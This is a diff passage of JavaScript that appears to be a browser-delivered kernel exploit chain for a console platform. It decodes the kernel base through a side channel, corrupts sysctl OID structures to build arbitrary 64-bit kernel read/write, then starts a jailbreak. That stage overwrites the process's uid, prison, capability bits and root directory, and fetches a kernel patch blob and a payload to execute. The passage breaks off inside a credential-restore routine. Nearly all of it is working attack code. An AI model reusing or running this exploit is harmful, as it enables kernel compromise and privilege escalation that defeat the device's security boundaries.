+      const J = JOBS[q];
+      let obs = "",
+        ones = 0,
+        edge = -1;
+      for (let k = 0; k < SWEEP; k++) {
+        const f = 0x40000000 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0;
+        obs += f ? "1" : "0";
+        if (f) ones++;
+        if (k > 0 && obs.charCodeAt(k) !== obs.charCodeAt(k - 1) && edge < 0)
+          edge = k;
+      }
+
+      const low = J.low();
+      const d = decodeByte(obs, low);
+      B[J.n] = d.b;
+      if (d.b < 0 || d.n !== 1) bad++;
+      mark(
+        "ANCHOR-BYTE",
+        J.n +
+          " gate=" +
+          J.g +
+          " j=" +
+          J.j +
+          " low=0x" +
+          low.toString(16) +
+          " ones=" +
+          ones +
+          " edge=" +
+          edge +
+          " cands=" +
+          d.n +
+          " val=" +
+          (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)),
+      );
+      if (J.want !== null)
+        check(
+          "anchor-control-" + J.n,
+          d.b === J.want,
+          "want=0x" +
+            J.want.toString(16) +
+            " got=" +
+            (d.b < 0 ? "none" : "0x" + d.b.toString(16)),
+        );
+    }
+    if (
+      !check(
+        "anchor-every-byte-unique",
+        bad === 0,
+        "nomatch=" + bad + " jobs=" + NJ,
+      )
+    )
+      return;
+
+    check(
+      "anchor-duplicates-agree",
+      B.b6 === B.b6d && B.b7 === B.b7d,
+      "b6=0x" +
+        B.b6.toString(16) +
+        " b6d=0x" +
+        B.b6d.toString(16) +
+        " b7=0x" +
+        B.b7.toString(16) +
+        " b7d=0x" +
+        B.b7d.toString(16),
+    );
+
+    const handlerLo =
+      (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>> 0;
+    const kbLo = (handlerLo - RVA_RSVD) >>> 0;
+    const KBASE = new int64(kbLo, 0xffffffff);
+    mark(
+      "ANCHOR-HANDLER",
+      "handler=0xffffffff" +
+        handlerLo.toString(16).padStart(8, "0") +
+        " rva=0x" +
+        RVA_RSVD.toString(16) +
+        " b7=0x" +
+        B.b7.toString(16) +
+        " b6=0x" +
+        B.b6.toString(16) +
+        " b1=0x" +
+        B.b1.toString(16) +
+        " b0=0x" +
+        B.b0.toString(16),
+    );
+
+    const kbAligned = (kbLo & 0x3fff) === 0;
+    check(
+      "ANCHOR-KERNEL-BASE",
+      kbAligned,
+      "kernel_base=" +
+        KBASE +
+        " aligned0x4000=" +
+        (kbAligned ? 1 : 0) +
+        " low=0x" +
+        kbLo.toString(16),
+    );
+    mark(
+      "ANCHOR-VERDICT",
+      "fw=" +
+        fwKey +
+        " kernel_base=" +
+        KBASE +
+        " armings=" +
+        armCount +
+        " curthread=" +
+        CT1 +
+        " verdict=" +
+        (kbAligned ? "ANCHORED" : "REJECTED") +
+        (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"),
+    );
+
+    if (!kbAligned) {
+      allDone = true;
+      return;
+    }
+
+    const OID = KBASE.add32(off.k_oid_kern_file);
+    const O_NUM = OID.add32(0x10);
+    const O_VIS = OID.add32(0x50);
+    const O_RAN = OID.add32(0x54);
+    const KERN_FILE_NUM = 15;
+    const ONUM_N = params.get("onum") ? parseInt(params.get("onum"), 10) : 64;
+    mark(
+      "KF-TARGETS",
+      "oid=" + OID + " oid_number=" + O_NUM + " vis=" + O_VIS + " ran=" + O_RAN,
+    );
+
+    function oracleAt(addr, n, label) {
+      const sAb = new ArrayBuffer(4);
+      keepAlive.push(sAb);
+      const sDv = new DataView(sAb),
+        sAd = bufAddr(sAb);
+      sDv.setInt32(0, 0x40000000, true);
+      let i = 0;
+      for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
+      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
+      if (runChain(i, label) === null) return null;
+      const m = 0x40000000 - sDv.getInt32(0, true);
+      return { m: m, v: m > 0 ? n - m + 1 : 0 };
+    }
+
+    function sweepAt(stepAd, probeAd, low, label) {
+      const sAb = new ArrayBuffer(4 * SWEEP);
+      keepAlive.push(sAb);
+      const sDv = new DataView(sAb),
+        sAd = bufAddr(sAb);
+      for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 0x40000000, true);
+      let i = 0;
+      for (let k = 0; k < SWEEP; k++) {
+        wnode(i++, stepAd, DUM, false);
+        wnode(i++, probeAd, sAd.add32(k * 4), false);
+      }
+      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
+      if (runChain(i, label) === null) return null;
+      let obs = "";
+      for (let k = 0; k < SWEEP; k++)
+        obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
+      return decodeByte(obs, low);
+    }
+
+    function planSub(cur, delta) {
+      const d = [
+        delta & 0xff,
+        (delta >>> 8) & 0xff,
+        (delta >>> 16) & 0xff,
+        (delta >>> 24) & 0xff,
+      ];
+      let clean = true;
+      for (let j = 1; j < 4; j++)
+        if (d[j] > ((cur >>> (8 * j)) & 0xff)) clean = false;
+      return { d: d, n: d[0] + d[1] + d[2] + d[3], clean: clean };
+    }
+    function emitSub(base, i, plan) {
+      const pos = [];
+      for (let j = 0; j < 4; j++)
+        for (let q = 0; q < plan.d[j]; q++) pos.push(j);
+      for (let j = 0; j < pos.length; j++)
+        wnode(i++, base.add32(pos[j]), DUM, false);
+      return i;
+    }
+
+    const CAPS_B = UCRED.add32(0x67);
+    const CAPS_PR = UCRED.add32(0x64);
+    const CAPS_TARGET = 0x60;
+    const CAPS_RESTORE = params.get("caprestore") === "1";
+    mark(
+      "CAPS-TARGET",
+      "ucred=" +
+        UCRED +
+        " caps0=" +
+        UCRED.add32(0x60) +
+        " byte=" +
+        CAPS_B +
+        " probe=" +
+        CAPS_PR +
+        " want_bit=62" +
+        " target=0x" +
+        CAPS_TARGET.toString(16),
+    );
+
+    const mf1 = multiFire(
+      [
+        { kind: "sweep", step: CAPS_B, probe: CAPS_PR, low: 0x000000 },
+        { kind: "oracle", addr: O_NUM, n: ONUM_N },
+      ],
+      "caps-byte+oid_number",
+    );
+    if (mf1 === null) return;
+    const cb = mf1[0],
+      on = mf1[1];
+
+    const bLo = (cb.b - 1) & 0xff,
+      bHi = cb.b;
+    const setLo = (bLo & 0x40) !== 0,
+      setHi = (bHi & 0x40) !== 0;
+    mark(
+      "CAPS-BYTE",
+      "b=" +
+        (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) +
+        " cands=" +
+        cb.n +
+        " true_in={0x" +
+        bLo.toString(16) +
+        ",0x" +
+        bHi.toString(16) +
+        "} bit62_lo=" +
+        (setLo ? 1 : 0) +
+        " bit62_hi=" +
+        (setHi ? 1 : 0),
+    );
+    if (
+      !check(
+        "caps-byte-decoded",
+        cb.b >= 0 && cb.n === 1,
+        "b=" + cb.b + " cands=" + cb.n,
+      )
+    )
+      return;
+
+    let capsWrote = 0,
+      capsSkip = "",
+      capsPend = 0;
+    if (setLo && setHi) {
+      capsSkip = "already-set";
+      mark("CAPS-SKIP", "bit62 set for both candidates -- no write");
+    } else if (params.get("nocaps") === "1") {
+      capsSkip = "opted-out";
+      mark("CAPS-SKIP", "?nocaps=1 -- read-only, gate 2 stays closed");
+    } else {
+      const dN = (bHi + 1) & 0xff;
+      const fin = [
+        (bHi - dN) & 0xff,
+        (bLo - dN) & 0xff,
+        (bHi - dN - 1) & 0xff,
+        (bLo - dN - 1) & 0xff,
+      ];
+      const allSet = fin.every(function (v) {
+        return (v & 0x40) !== 0;
+      });
+      mark(
+        "CAPS-PLAN",
+        "decrement " +
+          CAPS_B +
+          " by " +
+          dN +
+          " -> final in {" +
+          fin
+            .map(function (v) {
+              return "0x" + v.toString(16);
+            })
+            .join(",") +
+          "} all_bit62=" +
+          (allSet ? 1 : 0) +
+          " wraps=1",
+      );
+      if (
+        !check(
+          "caps-plan-ok",
+          dN > 0 && dN <= 0x100 && allSet,
+          "n=" + dN + " finals=" + fin.join(","),
+        )
+      )
+        return;
+      capsPend = dN;
+    }
+
+    function multiFire(jobs, label) {
+      let need = 0;
+      for (const j of jobs) need += j.kind === "sweep" ? SWEEP * 2 : j.n;
+      mark(
+        "MF-PLAN",
+        label +
+          " jobs=" +
+          jobs.length +
+          " nodes=" +
+          need +
+          " kinds=" +
+          jobs
+            .map(function (j) {
+              return j.kind;
+            })
+            .join(","),
+      );
+      if (
+        !check(
+          "mf-bounded-" + label,
+          need > 0 && need <= MAXN,
+          "need=" + need + " arena=" + MAXN,
+        )
+      )
+        return null;
+      const nSink = jobs.reduce(function (a, j) {
+        return a + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0);
+      }, 0);
+      const sAb = new ArrayBuffer(4 * Math.max(1, nSink));
+      keepAlive.push(sAb);
+      const sDv = new DataView(sAb),
+        sAd = bufAddr(sAb);
+      for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 0x40000000, true);
+      let i = 0,
+        sk = 0;
+      const base = [];
+      for (const j of jobs) {
+        base.push(sk);
+        if (j.kind === "sweep") {
+          for (let k = 0; k < SWEEP; k++) {
+            wnode(i++, j.step, DUM, false);
+            wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
+          }
+          sk += SWEEP;
+        } else if (j.kind === "oracle") {
+          for (let k = 0; k < j.n; k++)
+            wnode(i++, j.addr, sAd.add32(sk * 4), false);
+          sk += 1;
+        } else {
+          for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
+        }
+      }
+      if (i === 0)
+        return jobs.map(function () {
+          return null;
+        });
+      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
+      if (runChain(i, label) === null) return null;
+      const out = [];
+      for (let q = 0; q < jobs.length; q++) {
+        const j = jobs[q];
+        if (j.kind === "sweep") {
+          let obs = "";
+          for (let k = 0; k < SWEEP; k++)
+            obs +=
+              0x40000000 - sDv.getInt32((base[q] + k) * 4, true) > 0
+                ? "1"
+                : "0";
+          out.push(decodeByte(obs, j.low));
+        } else if (j.kind === "oracle") {
+          const m = 0x40000000 - sDv.getInt32(base[q] * 4, true);
+          out.push({ m: m, v: m > 0 ? j.n - m + 1 : 0 });
+        } else out.push({ n: j.n });
+      }
+      return out;
+    }
+
+    const IPV6_TCLASS = 61,
+      KF_MARK = 0x41;
+    const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
+    if (kfSock >= 0) {
+      opened.push(kfSock);
+      const tAb = new ArrayBuffer(4);
+      const tDv = new DataView(tAb);
+      tDv.setInt32(0, KF_MARK, true);
+      sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
+    }
+    if (
+      !check(
+        "kf-target-socket",
+        kfSock >= 0,
+        "fd=" + kfSock + " tclass=0x" + KF_MARK.toString(16),
+      )
+    )
+      return;
+
+    const mibAb = new ArrayBuffer(8);
+    keepAlive.push(mibAb);
+    const mibDv = new DataView(mibAb),
+      mibAd = bufAddr(mibAb);
+    mibDv.setInt32(0, 1, true);
+    mibDv.setInt32(4, KERN_FILE_NUM, true);
+    const KF_BYTES = 1 << 20;
+    const kfAb = new ArrayBuffer(KF_BYTES);
+    keepAlive.push(kfAb);
+    const kfDv = new DataView(kfAb),
+      kfAd = bufAddr(kfAb);
+    const olAb = new ArrayBuffer(8);
+    keepAlive.push(olAb);
+    const olDv = new DataView(olAb),
+      olAd = bufAddr(olAb);
+    function kernFile(withBuf, tag) {
+      olDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
+      olDv.setInt32(4, 0, true);
+      const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0);
+      const rv = r.i32,
+        er = rv < 0 ? errno() : 0;
+      const ln = olDv.getUint32(0, true);
+      mark("KF-SYSCTL", tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln);
+      return { rv: rv, err: er, len: ln };
+    }
+
+    const base0 = kernFile(false, "baseline");
+    check(
+      "kf-baseline-is-enoent",
+      base0.rv < 0 && base0.err === 2,
+      "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2",
+    );
+
+    mark(
+      "KF-OIDNUM",
+      "addr=" +
+        O_NUM +
+        " n=" +
+        ONUM_N +
+        " m=" +
+        on.m +
+        " v=" +
+        on.v +
+        " want=" +
+        KERN_FILE_NUM,
+    );
+    if (
+      !check(
+        "KF-ANCHOR-CONFIRMED",
+        on.v === KERN_FILE_NUM,
+        "oid_number=" +
+          on.v +
+          " want=" +
+          KERN_FILE_NUM +
+          " kernel_base=" +
+          KBASE,
+      )
+    )
+      return;
+
+    const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0;
+    const pNum = planSub(curNum, (curNum - KERN_FILE_NUM) >>> 0);
+    mark(
+      "KF-RESTORE-PLAN",
+      "cur=0x" +
+        curNum.toString(16) +
+        " digits=" +
+        pNum.d.join(",") +
+        " nodes=" +
+        pNum.n +
+        " clean=" +
+        (pNum.clean ? 1 : 0),
+    );
+    if (
+      !check(
+        "kf-restore-clean",
+        pNum.clean && pNum.n <= 1020,
+        "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0),
+      )
+    )
+      return;
+
+    {
+      let i = emitSub(O_NUM, 0, pNum);
+      wnode(i++, O_VIS, DUM, false);
+      for (let q = 0; q < capsPend; q++) wnode(i++, CAPS_B, DUM, false);
+      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
+      mark(
+        "KF-WRITE",
+        "restore_oid_number=" +
+          pNum.n +
+          " unhide=1 caps=" +
+          capsPend +
+          " total=" +
+          i,
+      );
+      if (runChain(i, "restore+unhide+caps") === null) return;
+      capsWrote = capsPend;
+    }
+    mark(
+      "CAPS-DONE",
+      "wrote=" +
+        capsWrote +
+        " skip=" +
+        (capsSkip || "none") +
+        " armings=" +
+        armCount,
+    );
+
+    const after = kernFile(false, "after-unhide");
+    const got = after.rv === 0 ? kernFile(true, "with-buffer") : null;
+
+    const capsLive = after.rv === 0;
+    const A_OID = KBASE.add32(off.k_oid_maxfilesperproc);
+    const A2_OID = KBASE.add32(off.k_oid_maxprocperuid);
+    const B_OID = KBASE.add32(off.k_oid_maxfiles);
+    const A_ARG1_CUR = KBASE.add32(off.k_arg1_maxfilesperproc);
+    const A2_ARG1_CUR = KBASE.add32(off.k_arg1_maxprocperuid);
+    const B_ARG1 = B_OID.add32(0x18);
+    mark(
+      "KRW-OIDS",
+      "A(1,27)=" +
+        A_OID +
+        " A2(1,28)=" +
+        A2_OID +
+        " B(1,7)=" +
+        B_OID +
+        " &B.arg1=" +
+        B_ARG1 +
+        " capsLive=" +
+        (capsLive ? 1 : 0),
+    );
+
+    function planLow(cur, tgt) {
+      if (cur.hi >>> 0 !== tgt.hi >>> 0) return null;
+      const b = [];
+      for (let k = 0; k < 4; k++) b.push((cur.low >>> (8 * k)) & 0xff);
+      b.push(0, 0, 0, 0);
+      const t = [];
+      for (let k = 0; k < 4; k++) t.push((tgt.low >>> (8 * k)) & 0xff);
+      function decwin(j) {
+        let c = -1;
+        for (let k = 0; k < 4 && j + k < 8; k++) {
+          let v = b[j + k] + c;
+          if (v < 0) {
+            v += 256;
+            c = -1;
+          } else c = 0;
+          b[j + k] = v;
+          if (c === 0) break;
+        }
+      }
+      const pos = [];
+      for (let j = 0; j < 4; j++) {
+        const d = (b[j] - t[j]) & 0xff;
+        for (let q = 0; q < d; q++) {
+          pos.push(j);
+          decwin(j);
+        }
+      }
+      const lowOk =
+        b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];
+      const hiClean = b[4] === 0 && b[5] === 0 && b[6] === 0 && b[7] === 0;
+      if (!lowOk || !hiClean || pos.length < 1 || pos.length > 4090)
+        return null;
+      return pos;
+    }
+
+    const posA = planLow(A_ARG1_CUR, B_ARG1);
+    const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
+    mark(
+      "KRW-PLAN",
+      "posA=" +
+        (posA ? posA.length : "REFUSED") +
+        " posA2=" +
+        (posA2 ? posA2.length : "REFUSED"),
+    );
+    const planOk = capsLive && !!posA && !!posA2;
+    if (
+      !check(
+        "krw-plan-ok",
+        planOk,
+        planOk
+          ? ""
+          : "capsLive=" +
+              (capsLive ? 1 : 0) +
+              " posA=" +
+              (posA ? posA.length : "null") +
+              " posA2=" +
+              (posA2 ? posA2.length : "null"),
+      )
+    ) {
+      allDone = true;
+    } else {
+      {
+        let i = 0;
+        wnode(i++, A_OID.add32(0x50), DUM, false);
+        wnode(i++, A2_OID.add32(0x50), DUM, false);
+        wnode(i++, B_OID.add32(0x50), DUM, false);
+        for (let k = 0; k < posA.length; k++)
+          wnode(i++, A_OID.add32(0x18 + posA[k]), DUM, false);
+        for (let k = 0; k < posA2.length; k++)
+          wnode(i++, A2_OID.add32(0x18 + posA2[k]), DUM, false);
+        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
+        mark(
+          "KRW-FIRE",
+          "nodes=" +
+            i +
+            " (3 unhide + " +
+            posA.length +
+            " A + " +
+            posA2.length +
+            " A2)",
+        );
+        if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
+          allDone = true;
+        } else if (runChain(i, "krw-setup") === null) {
+          allDone = true;
+        } else {
+          const kmAb = new ArrayBuffer(8);
+          keepAlive.push(kmAb);
+          const kmDv = new DataView(kmAb),
+            kmAd = bufAddr(kmAb);
+          const koAb = new ArrayBuffer(4);
+          keepAlive.push(koAb);
+          const koDv = new DataView(koAb),
+            koAd = bufAddr(koAb);
+          const knAb = new ArrayBuffer(4);
+          keepAlive.push(knAb);
+          const knDv = new DataView(knAb),
+            knAd = bufAddr(knAb);
+          const klAb = new ArrayBuffer(8);
+          keepAlive.push(klAb);
+          const klDv = new DataView(klAb),
+            klAd = bufAddr(klAb);
+          function kMib(a, b) {
+            kmDv.setInt32(0, a, true);
+            kmDv.setInt32(4, b, true);
+          }
+          function kSysRead(a, b) {
+            kMib(a, b);
+            klDv.setInt32(0, 4, true);
+            klDv.setInt32(4, 0, true);
+            koDv.setInt32(0, 0, true);
+            const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
+            const er = r < 0 ? errno() : 0;
+            const vl = koDv.getInt32(0, true);
+            return { rv: r, err: er, val: vl };
+          }
+          function kSysWrite(a, b, v) {
+            kMib(a, b);
+            knDv.setInt32(0, v | 0, true);
+            const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
+            const er = r < 0 ? errno() : 0;
+            return { rv: r, err: er };
+          }
+
+          function steer(X) {
+            kSysWrite(1, 27, X.low | 0);
+            kSysWrite(1, 28, X.hi | 0);
+          }
+          function kread32(X) {
+            steer(X);
+            return kSysRead(1, 7).val >>> 0;
+          }
+          function kwrite32(X, v) {
+            steer(X);
+            return kSysWrite(1, 7, v | 0).rv;
+          }
+          function read8(X) {
+            const lo = kread32(X),
+              hi = kread32(X.add32(4));
+            return new int64(lo >>> 0, hi >>> 0);
+          }
+          function write8(X, V) {
+            kwrite32(X, V.low | 0);
+            kwrite32(X.add32(4), V.hi | 0);
+          }
+
+          const t1 = kread32(A_OID.add32(0x10));
+          mark("KRW-T1-READ32-IMG", "*(A_oid+0x10)=" + t1 + " want=27");
+          check("krw-read32-image", t1 === 27, "got=" + t1);
+
+          const t2 = read8(A_OID.add32(0x10));
+          const t2ok = t2.low >>> 0 === 27 && t2.hi >>> 0 === 0xc0040002;
+          mark(
+            "KRW-T2-READ8-IMG",
+            "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002",
+          );
+          check("krw-read8-image", t2ok, "got=" + t2);
+
+          const uidNow = sc(SYS.getuid).i32 >>> 0;
+          const t3 = kread32(UCRED.add32(0x04));
+          mark(
+            "KRW-T3-READ32-HEAP",
+            "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow,
+          );
+          check(
+            "krw-read32-heap",
+            t3 === uidNow,
+            "cr_uid=" + t3 + " getuid=" + uidNow,
+          );
+          mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read8(UCRED));
+
+          const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
+          const o4 = kread32(SCR4);
+          kwrite32(SCR4, 0x41424344);
+          const r4 = kread32(SCR4);
+          kwrite32(SCR4, o4 | 0);
+          const b4 = kread32(SCR4);
+          mark(
+            "KRW-T4-WRITE32",
+            "orig=" +
+              o4 +
+              " wrote=0x41424344 readback=0x" +
+              r4.toString(16) +
+              " restored=" +
+              b4,
+          );
+          check(
+            "krw-write32",
+            r4 === 0x41424344 && b4 === o4,
+            "readback=0x" + r4.toString(16) + " restored=" + b4,
+          );
+
+          const SCR8 = KBASE.add32(off.k_oid_maxfiles + 0x20);
+          const o8 = read8(SCR8);
+          const MAGIC8 = new int64(0xdeadbeef, 0x11223344);
+          write8(SCR8, MAGIC8);
+          const r8 = read8(SCR8);
+          write8(SCR8, o8);
+          const b8 = read8(SCR8);
+          const t5ok =
+            r8.low >>> 0 === 0xdeadbeef &&
+            r8.hi >>> 0 === 0x11223344 &&
+            b8.low >>> 0 === o8.low >>> 0 &&
+            b8.hi >>> 0 === o8.hi >>> 0;
+          mark(
+            "KRW-T5-WRITE64",
+            "orig=" +
+              o8 +
+              " wrote=" +
+              MAGIC8 +
+              " readback=" +
+              r8 +
+              " restored=" +
+              b8,
+          );
+          check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);
+
+          mark(
+            "KRW-VERDICT",
+            "fw=" +
+              fwKey +
+              " kernel_base=" +
+              KBASE +
+              " read32=" +
+              (t1 === 27 ? 1 : 0) +
+              " read8=" +
+              (t2ok ? 1 : 0) +
+              " heap=" +
+              (t3 === uidNow ? 1 : 0) +
+              " write32=" +
+              (r4 === 0x41424344 ? 1 : 0) +
+              " write64=" +
+              (t5ok ? 1 : 0) +
+              " armings=" +
+              armCount +
+              "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **",
+          );
+          mark(
+            "KRW-API",
+            "read8/write8/kread32/kwrite32 ready -- drop into the" +
+              " lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)",
+          );
+
+          const krwOk =
+            t1 === 27 && t2ok && t3 === uidNow && r4 === 0x41424344 && t5ok;
+          mark(
+            "EG-GATE",
+            "krwOk=" +
+              (krwOk ? 1 : 0) +
+              " jb=" +
+              (DO_JB ? 1 : 0) +
+              " patch=" +
+              (DO_PATCH ? 1 : 0) +
+              " payload=" +
+              (DO_PAYLOAD ? 1 : 0),
+          );
+          if (
+            !check(
+              "eg-krw-ok",
+              krwOk,
+              "krwOk=" +
+                (krwOk ? 1 : 0) +
+                " (endgame needs all 5 KRW self-tests to pass)",
+            )
+          ) {
+            allDone = true;
+          } else {
+            const sameI64 = (a, b) =>
+              a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
+            const kptr = (v) => !!v && v.hi >>> 0 >= 0xffff0000;
+            const NEG1 = new int64(0xffffffff, 0xffffffff);
+            function kview(base) {
+              return {
+                getBInt: (o) => read8(base.add32(o)),
+                setBInt: (o, v) => write8(base.add32(o), v),
+                getInt32: (o) => kread32(base.add32(o)) | 0,
+                setInt32: (o, v) => {
+                  kwrite32(base.add32(o), v | 0);
+                },
+              };
+            }
+            function findStub(num) {
+              for (let o = 0; o < off.k_scan_stage1; o += 16) {
+                const v = p.read8(libkernelBase.add32(o));
+                if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
+                  continue;
+                if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === num)
+                  return libkernelBase.add32(o);
+              }
+              return null;
+            }
+            const stSetuid = findStub(23),
+              stGeteuid = findStub(25),
+              stOpen = findStub(5);
+            let jbDone = false,
+              kpDone = false,
+              plDone = false,
+              jbUcred = null;
+            let jbSaved = null,
+              jbRestored = false;
+
+            let kpatchBlob = null,
+              payloadBlob = null;
+            const SITES = [];
+            if (DO_PATCH) {
+              try {
+                const r = await fetch(KPATCH_FILE);
+                if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
+              } catch (e) {
+                mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
+              }
+              if (kpatchBlob)
+                for (let i = 0; i + 7 <= kpatchBlob.length; i++) {
+                  if (kpatchBlob[i] !== 0xc6 || kpatchBlob[i + 1] !== 0x81)
+                    continue;
+                  if (kpatchBlob[i + 6] !== 0xeb) continue;
+                  SITES.push(
+                    (kpatchBlob[i + 2] |
+                      (kpatchBlob[i + 3] << 8) |
+                      (kpatchBlob[i + 4] << 16) |
+                      (kpatchBlob[i + 5] << 24)) >>>
+                      0,
+                  );
+                }
+              mark(
+                "KPATCH-BLOB",
+                "file=" +
+                  KPATCH_FILE +
+                  " bytes=" +
+                  (kpatchBlob ? kpatchBlob.length : 0) +
+                  " sites=" +
+                  SITES.length,
+              );
+            }
+            if (DO_PAYLOAD) {
+              try {
+                const r = await fetch(PAYLOAD_FILE);
+                if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
+              } catch (e) {
+                mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
+              }
+              mark(
+                "PAYLOAD-BLOB",
+                "file=" +
+                  PAYLOAD_FILE +
+                  " bytes=" +
+                  (payloadBlob ? payloadBlob.length : 0) +
+                  " head=" +
+                  (payloadBlob
+                    ? payloadBlob[0] === 0xe9
+                      ? "e9-ok"
+                      : "NOT-e9"
+                    : "none"),
+              );
+            }
+
+            if (DO_JB) {
+              const P_UCRED = 0x40,
+                P_FD = 0x48,
+                TD_PROC = 0x8;
+              const CR_UID = 0x04,
+                CR_RUID = 0x08,
+                CR_SVUID = 0x0c,
+                CR_NGROUPS = 0x10;
+              const CR_RGID = 0x14,
+                CR_PRISON = 0x30,
+                CR_SCECAPS1 = 0x60,
+                CR_SCECAPS0 = 0x68;
+              const FD_RDIR = 0x10,
+                FD_JDIR = 0x18;
+              const curproc = read8(CT1.add32(TD_PROC));
+              jbUcred = kptr(curproc) ? read8(curproc.add32(P_UCRED)) : null;
+              const pFd = kptr(curproc) ? read8(curproc.add32(P_FD)) : null;
+
+              const prison0 = KBASE.add32(off.k_prison0);
+              const rootvn = read8(KBASE.add32(off.k_rootvnode));
+              mark(
+                "JB-SOURCES",
+                "curproc=" +
+                  curproc +
+                  " ucred=" +
+                  jbUcred +
+                  " krwUcred=" +
+                  UCRED +
+                  " p_fd=" +
+                  pFd +
+                  " prison0=" +
+                  prison0 +
+                  " rootvnode=" +
+                  rootvn,
+              );
+              const srcOk =
+                kptr(curproc) &&
+                kptr(jbUcred) &&
+                kptr(pFd) &&
+                kptr(rootvn) &&
+                sameI64(jbUcred, UCRED);
+              if (
+                check(
+                  "jb-sources-are-kernel-pointers",
+                  srcOk,
+                  "curproc=" +
+                    curproc +
+                    " ucred=" +
+                    jbUcred +
+                    " pfd=" +
+                    pFd +
+                    " rootvn=" +
+                    rootvn,
+                )
+              ) {
+                const uidBefore = sc(SYS.getuid).i32;
+                const probePaths = ["/", "/system", "/mini-syscore.elf"];
+                const before = [];
+                if (stOpen)
+                  for (const pth of probePaths) {
+                    const pab = new ArrayBuffer(pth.length + 1);
+                    keepAlive.push(pab);
+                    const pu8 = new Uint8Array(pab);
+                    for (let i = 0; i < pth.length; i++)
+                      pu8[i] = pth.charCodeAt(i);
+                    const fd = callAddr(stOpen, [bufAddr(pab), 0, 0]).i32;
+                    before.push(pth + "=" + fd);
+                    if (fd >= 0) sc(SYS.close, fd);
+                  }
+                mark(
+                  "JB-PRECHECK",
+                  "getuid=" + uidBefore + " sandbox=[" + before.join(" ") + "]",
+                );
+
+                const U = kview(jbUcred),
+                  F = kview(pFd);
+
+                jbSaved = {
+                  U: U,
+                  F: F,
+                  ucred: jbUcred,
+                  fd: pFd,
+                  prison: U.getBInt(CR_PRISON),
+                  rdir: F.getBInt(FD_RDIR),
+                  jdir: F.getBInt(FD_JDIR),
+                  caps1: U.getBInt(CR_SCECAPS1),
+                  caps0: U.getBInt(CR_SCECAPS0),
+                  uid: U.getInt32(CR_UID),
+                  ruid: U.getInt32(CR_RUID),
+                  svuid: U.getInt32(CR_SVUID),
+                  ngroups: U.getInt32(CR_NGROUPS),
+                  rgid: U.getInt32(CR_RGID),
+                  off: {
+                    CR_UID,
+                    CR_RUID,
+                    CR_SVUID,
+                    CR_NGROUPS,
+                    CR_RGID,
+                    CR_PRISON,
+                    CR_SCECAPS1,
+                    CR_SCECAPS0,
+                    FD_RDIR,
+                    FD_JDIR,
+                  },
+                };
+                mark(
+                  "JB-SAVED",
+                  "prison=" +
+                    jbSaved.prison +
+                    " rdir=" +
+                    jbSaved.rdir +
+                    " jdir=" +
+                    jbSaved.jdir +
+                    " uid=" +
+                    jbSaved.uid +
+                    " caps=" +
+                    jbSaved.caps1 +
+                    "/" +
+                    jbSaved.caps0 +
+                    "  (refcounted handles -- restoring these is what keeps" +
+                    " fdescfree/crfree balanced at process exit)",
+                );
+
+                jbRestoreHook = function (why) {
+                  if (jbRestored) return true;
+
+                  F.setBInt(FD_RDIR, jbSaved.rdir);
+                  F.setBInt(FD_JDIR, jbSaved.jdir);
+                  U.setBInt(CR_PRISON, jbSaved.prison);
+                  U.setBInt(CR_SCECAPS1, jbSaved.caps1);
+                  U.setBInt(CR_SCECAPS0, jbSaved.caps0);
+                  U.setInt32(CR_UID, jbSaved.uid);
+                  U.setInt32(CR_RUID, jbSaved.ruid);
+                  U.setInt32(CR_SVUID, jbSaved.svuid);
+                  U.setInt32(CR_NGROUPS, jbSaved.ngroups);
+                  U.setInt32(CR_RGID, jbSaved.rgid);
+                  const okRdir = sameI64(F.getBInt(FD_RDIR), jbSaved.rdir);
+                  const okJdir = sameI64(F.getBInt(FD_JDIR), jbSaved.jdir);
+                  const okPr = sameI64(U.getBInt(CR_PRISON), jbSaved.prison);
